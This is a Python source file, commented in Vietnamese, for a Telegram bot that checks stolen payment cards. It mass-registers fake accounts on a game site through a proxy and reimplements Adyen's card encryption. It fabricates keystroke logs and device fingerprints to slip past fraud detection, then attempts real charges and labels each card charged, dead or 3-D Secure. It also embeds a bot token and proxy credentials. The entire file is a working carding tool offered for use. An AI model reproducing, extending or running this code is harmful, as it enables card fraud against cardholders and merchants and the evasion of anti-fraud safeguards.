import telebot
import requests
import re
import os
import json
import hmac
import hashlib
import base64
from datetime import datetime
import random
import string
import time
from fake_useragent import UserAgent
import urllib3
from colorama import Fore, init

# Khởi tạo colorama (dù chạy bot nhưng giữ lại để debug trên terminal nếu cần)
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================================================================
# === CẤU HÌNH BOT TELEGRAM
# ===================================================================

# THAY TOKEN BOT CỦA BẠN VÀO ĐÂY
API_TOKEN = '8414556300:AAGs-pW76xOmEzi-SbLcHDaUOiUXtYpBq_0' 

bot = telebot.TeleBot(API_TOKEN)

# ===================================================================
# === CẤU HÌNH PROXY & KEY
# ===================================================================

proxy_host = "aus.360s5.com"
proxy_port = "3600"
proxy_user = "88634867-zone-custom"
proxy_pass = "AetOKcLB"

# Proxy URL chuẩn
proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

proxies = {
    "http": proxy_url,
    "https" : proxy_url
}

# Key Config
ADYEN_KEY = "10001|98BA34B1675D6C2540AC464A37D0F13CBF019896E8B889F387C1481F69B1E6041A6A2D2EC48F6496619641447BE2F2A4ACBCC4AA8F51FDF0F9DD2ABE6D5C41FB8AD54DF47980A6F90C273D549BBF6A2DADF8A9B12D269C1C73BB5E48C931AB8F4C3E1A5666F85D73FDE2A99DA0BD3C152B5AA4D538EA9A922FA8FCA01B6C176CDB2922FFAA3052651BA456E4FF7D8B010549BCDC4357EDD1FFE3D1111281BD4C1BDE53562960B3BB81CF5C4F2EC3EEA6888FC9598524E5C327336AE5DEACE77983FF804CFC0FC83A2B6FECBD1F024651598E8D556ED341A0F0C58C997A8837154C76226D76D6B4D2D3EA3C5FAE83AFF395F0BA5675EB3789C11C8718699E5E43"
STRIPE_KEY = "live_4TWKSNW445CGJJGVPEWXKHDAGMMTXVQT" 
DOMAIN_URL = "https://taongafarm.com"

# Thư viện mã hóa
try:
    from Cryptodome.PublicKey import RSA
    from Cryptodome.Cipher import PKCS1_OAEP, AES
    from Cryptodome.Util.Padding import pad
    from jose import jwk
except ImportError:
    print("Thiếu thư viện! Vui lòng chạy: pip install pycryptodomex python-jose requests")
    exit()

# ===================================================================
# === PHẦN 1: THUẬT TOÁN MÃ HÓA ADYEN (GIỮ NGUYÊN)
# ===================================================================

def get_current_timestamp():
    return datetime.utcnow().isoformat() + 'Z'

def generate_fake_log(length):
    base_time = random.randint(2000, 5000)
    events = []
    events.append(f"fo@{base_time}")
    base_time += random.randint(50, 200)
    events.append(f"cl@{base_time}")
    base_time += random.randint(100, 300)
    for _ in range(length):
        base_time += random.randint(80, 250) 
        events.append(f"KN@{base_time}")
    base_time += random.randint(200, 500)
    events.append(f"ch@{base_time}")
    
    log_string = ",".join(events)
    return {
        "log": log_string,
        "key_count": str(length),
        "click_count": "1",
        "focus_count": "1"
    }

def w(e):
    t = e
    if isinstance(t, str):
        t = t.encode('utf-8')
    return base64.b64encode(t).decode('utf-8')

def _(e):
    return w(e).replace('=', '').replace('+', '-').replace('/', '_')

def k(e):
    if not e:
        return bytearray(0)
    if len(e) % 2 == 1:
        e = "0" + e
    t = len(e) // 2
    r = bytearray(t)
    for n in range(t):
        r[n] = int(e[n*2:n*2+2], 16)
    return r

bt = 2**32

def mt(e, t, r):
    if not (0 <= t < bt):
        raise ValueError(f"value must be >= 0 and <= {bt - 1}. Received {t}")
    e[r:r+4] = [(t >> 24) & 0xff, (t >> 16) & 0xff, (t >> 8) & 0xff, t & 0xff]

class AdyenV4_8_0:
    def __init__(self, site_key):
        self.site_key = site_key
        self.key_object = None

    def generate_key(self):
        parts = self.site_key.split("|")
        if len(parts) != 2:
            raise ValueError("Malformed public key: incorrect split parts")
        part1 = parts[0]
        part2 = parts[1]
        decoded_part1 = k(part1)
        decoded_part2 = k(part2)
        encoded_part1 = _(decoded_part1)
        encoded_part2 = _(decoded_part2)

        self.key_object = {
            "kty": "RSA",
            "kid": "asf-key",
            "e": encoded_part1,
            "n": encoded_part2,
            "alg": "RSA-OAEP",
        }
        return self.key_object

    def encrypt_data(self, plain_text):
        public_key = jwk.construct(self.key_object)
        pem = public_key.to_pem().decode('utf-8')
        rsa_key = RSA.import_key(pem)

        random_bytes = os.urandom(64)
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        encrypted_key = cipher_rsa.encrypt(random_bytes)
        
        cek = random_bytes
        protected_header = {"alg":"RSA-OAEP","enc":"A256CBC-HS512","version":"1"}
        protected_header_b64 = _(json.dumps(protected_header).encode('utf-8'))
        
        _iv = os.urandom(16)
        _plaintext = json.dumps(plain_text).encode('utf-8')
        
        aes_key = cek[32:]
        hmac_key = cek[:32]
        
        cipher_aes = AES.new(aes_key, AES.MODE_CBC, _iv)
        padded_plaintext = pad(_plaintext, AES.block_size)
        ciphertext = cipher_aes.encrypt(padded_plaintext)
        
        protected_header2_bytes = protected_header_b64.encode('utf-8')
        f = len(protected_header2_bytes) * 8
        d = f // bt
        h_val = f % bt
        y = bytearray(8)
        mt(y, d, 0)
        mt(y, h_val, 4)

        hmac_obj = hmac.new(hmac_key, digestmod=hashlib.sha512)
        hmac_obj.update(protected_header2_bytes + _iv + ciphertext + y)
        tag = hmac_obj.digest()[:32]

        return f"{protected_header_b64}.{_(encrypted_key)}.{_(_iv)}.{_(ciphertext)}.{_(tag)}"

def format_card_number(card):
    return ' '.join(card[i:i+4] for i in range(0, len(card), 4))

def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key=None, domain=None):
    if not all([card, month, year, cvc, adyen_key]):
        raise ValueError("Missing card details or Adyen key")

    if not stripe_key:
        stripe_key = "live_2WKDYLJCMBFC5CFHBXY2CHZF4MUUJ7QU"
    if not domain:
        domain = "https://taongafarm.com"
        
    domain_b64 = base64.b64encode(domain.encode('utf-8')).decode('utf-8')
    referrer = f"https://checkoutshopper-live.adyen.com/checkoutshopper/securedfields/{stripe_key}/5.5.3/securedFields.html?type=card&d={domain_b64}"
    
    card_number = format_card_number(card)
    card_log_data = generate_fake_log(len(card_number))
    cvc_log_data = generate_fake_log(len(cvc))

    card_detail = {
        "encryptedCardNumber": {
            "number": card_number, 
            "generationtime": get_current_timestamp(), 
            "numberBind": "1", 
            "activate": str(random.randint(3, 5)),
            "referrer": referrer, 
            "numberFieldFocusCount": card_log_data['focus_count'], 
            "numberFieldLog": card_log_data['log'],
            "numberFieldClickCount": card_log_data['click_count'], 
            "numberFieldKeyCount": card_log_data['key_count']
        },
        "encryptedExpiryMonth": {
            "expiryMonth": month, 
            "generationtime": get_current_timestamp()
        },
        "encryptedExpiryYear": {
            "expiryYear": year, 
            "generationtime": get_current_timestamp()
        },
        "encryptedSecurityCode": {
            "cvc": cvc, 
            "generationtime": get_current_timestamp(), 
            "cvcBind": "1", 
            "activate": str(random.randint(2, 4)), 
            "referrer": referrer, 
            "cvcFieldFocusCount": cvc_log_data['focus_count'], 
            "cvcFieldLog": cvc_log_data['log'],
            "cvcFieldClickCount": cvc_log_data['click_count'], 
            "cvcFieldKeyCount": cvc_log_data['key_count'], 
            "cvcFieldChangeCount": "1", 
            "cvcFieldBlurCount": "1", 
            "deactivate": "1"
        }
    }

    adyen_encryptor = AdyenV4_8_0(adyen_key)
    adyen_encryptor.generate_key()
    
    encrypted_details = {}
    for key, value in card_detail.items():
        encrypted_details[key] = adyen_encryptor.encrypt_data(value)
        
    return encrypted_details

# ===================================================================
# === PHẦN 2: HELPER FUNCTIONS (CẬP NHẬT THEO YÊU CẦU)
# ===================================================================

def normalize_card(card_str):
    pattern = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    match = re.search(pattern, card_str)
    
    if not match:
        return None
    
    card_num, month, year, cvv = match.groups()
    
    # Validate Month
    try:
        month_int = int(month)
        if month_int < 1 or month_int > 12: return None
    except ValueError: return None
    
    # Validate Year
    if len(year) == 2: year = '20' + year
    try:
        year_int = int(year)
        if year_int > 2040: return None
    except ValueError: return None
    
    month = month.zfill(2)
    return f"{card_num}|{month}|{year}|{cvv}"

def extract_cards_from_text(text):
    if not text: return []
    valid_cards = []
    seen = set()
    lines = text.splitlines()
    pattern_strict = r'(\d{13,19})[\s|/;:.-]+(\d{1,2})[\s|/;:.-]+(\d{2,4})[\s|/;:.-]+(\d{3,4})'
    
    for line in lines:
        matches = re.findall(pattern_strict, line)
        for m in matches:
            temp_str = f"{m[0]}|{m[1]}|{m[2]}|{m[3]}"
            normalized = normalize_card(temp_str)
            if normalized and normalized not in seen:
                valid_cards.append(normalized)
                seen.add(normalized)
    return valid_cards

def validate_luhn(card_number):
    card_num = ''.join(filter(str.isdigit, str(card_number)))
    if not card_num or len(card_num) < 13 or len(card_num) > 19: return False
    total = 0
    reverse_digits = card_num[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n = n * 2
            if n > 9: n = n - 9
        total += n
    return total % 10 == 0

def get_short_brand_name(cc):
    first_digit = cc[0]
    if first_digit in ['5', '2']: return 'mc'
    elif first_digit == '4': return 'visa'
    elif cc.startswith('34') or cc.startswith('37'): return 'amex'
    elif cc.startswith('60') or cc.startswith('64') or cc.startswith('65'): return 'discover'
    elif cc.startswith('62'): return 'cup'
    elif cc.startswith('35'): return 'jcb'
    elif cc.startswith('30') or cc.startswith('36') or cc.startswith('38'): return 'diners'
    elif cc.startswith('67'): return 'maestro'
    else: return 'unknown'

def generate_random_email():
    # Danh sách 100 tên phổ biến tại Việt Nam
    vietnamese_names = [
        "An", "Anh", "Bao", "Binh", "Cuong", "Chau", "Chi", "Dung", "Dat", "Duc", 
        "Duy", "Diep", "Duong", "Giang", "Gia", "Hai", "Hao", "Hieu", "Hoang", "Huy", 
        "Hung", "Hanh", "Hoa", "Hue", "Huong", "Khanh", "Khoi", "Kien", "Kiet", "Lamm", 
        "Linh", "Long", "Loc", "Luan", "Ly", "Mai", "Minh", "Manh", "Nam", "Nghia", 
        "Ngoc", "Nguyen", "Nhan", "Nhat", "Nhi", "Nhung", "Oanh", "Phong", "Phuc", "Phuong", 
        "Quan", "Quang", "Quoc", "Quyen", "Son", "Sang", "Sinh", "Si", "Tai", "Tam", 
        "Tan", "Thang", "Thanh", "Thao", "Thinh", "Thu", "Thuy", "Tien", "Tin", "Toan", 
        "Tri", "Trong", "Truc", "Trung", "Tu", "Tuan", "Tung", "Tuyet", "Uyen", "Van", 
        "Viet", "Vu", "Vy", "Xuan", "Yen", "Tram", "Trang", "Dieu", "Ha", "Thien",
        "Bich", "Cam", "Dan", "Loan", "Nga", "Phu", "Thuan", "Vinh", "Khoa"
    ]
    
    # Các từ ngữ/hậu tố người Việt hay dùng
    suffixes = [
        "vip", "pro", "cute", "baby", "xinh", "depzai", "hotboy", "hotgirl", 
        "no1", "so1", "123", "999", "888", "6789", "2k", "2k1", "2k2", "2k3", 
        "9x", "8x", "official", "real", "bds", "hcm", "hn", "love", "forever"
    ]
    
    # Random họ (giả lập)
    last_names = ["nguyen", "tran", "le", "pham", "hoang", "huynh", "phan", "vu", "vo", "dang", "bui", "do"]

    name = random.choice(vietnamese_names).lower()
    last = random.choice(last_names).lower()
    suffix = random.choice(suffixes)
    random_num = ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    
    # Các kiểu ghép tên email phổ biến
    formats = [
        f"{last}{name}{random_num}",
        f"{name}{last}{suffix}",
        f"{name}{suffix}{random_num}",
        f"{last}.{name}.{random_num}",
        f"{name}_{suffix}_{random_num}"
    ]
    
    email_user = random.choice(formats)
    return f"{email_user}@gmail.com"

def generate_dadus():
    try:
        user = UserAgent().random
    except Exception:
        user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
    return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')

# ===================================================================
# === PHẦN 3: LOGIC KIỂM TRA THẺ (TÍCH HỢP VÀO HÀM)
# ===================================================================

def process_check_card(cc, mm, yyyy, cvc):
    """
    Hàm thực hiện toàn bộ quy trình: Đăng ký -> Mã hóa -> Charge
    Cập nhật: Retry đăng ký liên tục khi thất bại với email mới.
    """
    
    # Tạo session mới cho mỗi lần check
    session = requests.Session()
    session.proxies.update(proxies)
    session.verify = False
    
    # Biến để lưu user-agent hiện tại, giúp charge dùng đúng UA lúc đăng ký
    current_user_agent = ""
    current_email = ""

    try:
        # --- BƯỚC 1: LẤY TOKEN & ĐĂNG KÝ (RETRY LOOP) ---
        retry_count = 0
        while True:
            retry_count += 1
            # Reset cookie nếu retry
            session.cookies.clear()
            
            current_user_agent = UserAgent().random
            current_email = generate_random_email()
            
            try:
                # 1.1 Lấy Token CSRF
                reg_headers = {
                    'accept': '*/*',
                    'accept-language': 'vi-VN,vi;q=0.9',
                    'referer': 'https://taongafarm.com/en/',
                    'user-agent': current_user_agent,
                }

                resp_token = session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=20)
                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text)
                if not match:
                     match = re.search(r"window.csrftoken='([^']+)'", resp_token.text)
                
                if not match:
                    # Nếu lỗi mạng hoặc không lấy được token, retry tiếp
                    continue
                
                token = match.group(1)
                
                # 1.2 Gửi Request Đăng ký
                reg_headers.update({
                    'accept': 'application/json, text/plain, */*',
                    'content-type': 'application/json',
                    'x-csrf-token': token,
                })
                session.cookies.set('_csrf', token, domain='taongafarm.com')

                reg_data = {
                    'email': current_email,
                    'password': 'Minhnhat@@123',
                    'register_info': {'device': {}, 'lang': 'en', 'nav': {'platform': 'Win32'}},
                    'skip_email_validation': False,
                    'user_agree_terms': True,
                }

                resp_reg = session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=20)
                
                # Kiểm tra thành công: phải có session_portal trong cookie
                if 'session_portal' in session.cookies.get_dict():
                    # Đăng ký thành công -> Thoát vòng lặp retry
                    break
                else:
                    # Đăng ký thất bại -> Lặp lại (tự động clear cookie ở đầu vòng lặp)
                    continue

            except Exception:
                # Gặp lỗi Exception trong quá trình request -> Lặp lại
                time.sleep(1) # Nghỉ 1 xíu tránh spam quá nhanh gây lỗi connection
                continue

        # --- BƯỚC 2: MÃ HÓA THẺ ---
        encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)

        # --- BƯỚC 3: CHARGE ---
        payment_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://taongafarm.com',
            'referer': 'https://taongafarm.com/',
            'user-agent': current_user_agent, # Dùng lại UA lúc đăng ký
        }

        payment_json_data = {
            'paymentRequest': {
                'riskData': {'clientData': generate_dadus()},
                'paymentMethod': {
                    'type': 'scheme',
                    'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
                    'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
                    'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
                    'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
                    'brand': get_short_brand_name(cc),
                },
                'storePaymentMethod': False,
                'origin': 'https://taongafarm.com',
                'clientStateDataIndicator': True,
            },
            'checkoutRequest': {
                'countryCodeFallback': 'GB',
                'email': current_email,
                'priceCurrency': 'GBP',
                'priceValue': 73.99,
            },
            'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
        }

        response = session.post(
            'https://taongafarm.com/payment/adyen/api/checkout/payment',
            headers=payment_headers,
            json=payment_json_data,
            timeout=30
        )

        data = response.json()
        cvcResultRaw = data.get('additionalData', {}).get('cvcResultRaw', 'N/A')
        refusalReasonRaw = data.get('additionalData', {}).get('refusalReasonRaw', 'N/A')
        resultCode = data.get('resultCode', data.get('additionalData', {}).get('resultCode', 'N/A'))
        
        # Phân loại kết quả
        if resultCode == "Authorised":
            return f"✅ CHARGED: {cc}|{mm}|{yyyy}|{cvc} - [Authorised] - Email: {current_email}"
        elif resultCode == "Refused":
            return f"❌ DIE: {cc}|{mm}|{yyyy}|{cvc} - [{refusalReasonRaw}]"
        elif resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
            return f"⚠️ 3DS: {cc}|{mm}|{yyyy}|{cvc} - [3D Secure]"
        else:
            return f"❌ UNK: {cc}|{mm}|{yyyy}|{cvc} - [{resultCode}]"

    except Exception as e:
        return f"❌ ERROR: {cc}|{mm}|{yyyy}|{cvc} - [Exception: {str(e)}]"

# ===================================================================
# === PHẦN 4: TELEGRAM BOT HANDLERS
# ===================================================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, "Xin chào! Gửi lệnh /st + list thẻ để kiểm tra.\nVí dụ:\n/st 400000|12|2025|123")

@bot.message_handler(commands=['st'])
def handle_check_cards(message):
    # Lấy nội dung tin nhắn, bỏ lệnh /st
    input_text = message.text.replace('/st', '').strip()
    
    # Dùng hàm của bạn để lọc thẻ
    cards = extract_cards_from_text(input_text)
    
    if not cards:
        bot.reply_to(message, "⚠️ Không tìm thấy thẻ hợp lệ. Vui lòng nhập theo định dạng: cc|mm|yy|cvv")
        return

    bot.reply_to(message, f"🔍 Đang kiểm tra {len(cards)} thẻ...")
    
    for card in cards:
        try:
            cc, mm, yy, cvc = card.split('|')
            
            # Check Luhn
            if not validate_luhn(cc):
                bot.reply_to(message, f"❌ LUHN FAIL: {cc}|{mm}|{yy}|{cvc}")
                continue
            
            # Gửi thông báo đang check (có thể bỏ qua nếu muốn spam ít hơn)
            # bot.send_message(message.chat.id, f"Processing: {cc}...")
            
            # Gọi hàm xử lý chính
            result_msg = process_check_card(cc, mm, yy, cvc)
            
            # Reply kết quả
            bot.reply_to(message, result_msg)
            
        except Exception as e:
            bot.reply_to(message, f"❌ Lỗi xử lý thẻ {card}: {e}")

# ===================================================================
# === MAIN RUN
# ===================================================================

if __name__ == "__main__":
    print("Bot đang chạy...")
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"Bot dừng do lỗi: {e}")
